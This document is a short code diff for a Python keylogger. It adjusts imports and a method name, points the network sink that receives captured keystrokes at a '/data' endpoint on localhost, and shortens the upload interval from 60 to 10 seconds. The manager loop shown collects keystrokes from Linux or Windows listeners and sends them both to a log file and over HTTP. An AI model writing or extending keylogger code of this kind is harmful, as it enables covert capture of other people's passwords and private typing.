@@ -6,9 +6,9 @@ from typing import Protocol
 
 from keylogger.file_writer import FileWriter
 from network_writer import NetworkWriter
-from .sinker import Sinker
-from .processor import  Processor
-from .listner import LinuxKeylogger, WindowsKeylogger, Listener
+from sinker import Sinker
+from processor import  Processor
+from listner import LinuxKeylogger, WindowsKeylogger, Listener
 
 logger = logging.getLogger(__name__)
 
@@ -51,9 +51,9 @@ class DefaultManager:
             keylogger = LinuxKeylogger()
 
         self.processor = Processor("")
-        self.sink = [FileWriter("keylogger.log"),NetworkWriter("http://localhost:5000")]
+        self.sink = [FileWriter("keylogger.log"),NetworkWriter("http://localhost:5000/data")]
         self.listner = keylogger
-        self.interval = 60
+        self.interval = 10
         self._loop_thread = threading.Thread(target=self._loop)
         self._stopped = False
 
@@ -84,7 +84,7 @@ class DefaultManager:
         while not self._stopped:
             data = self.listner.get_data()
             if data:
-                processed_data = self.processor.process(data)
+                processed_data = self.processor.process_data(data)
                 for sink in self.sink:
                     sink.sink(processed_data)
             time.sleep(self.interval)
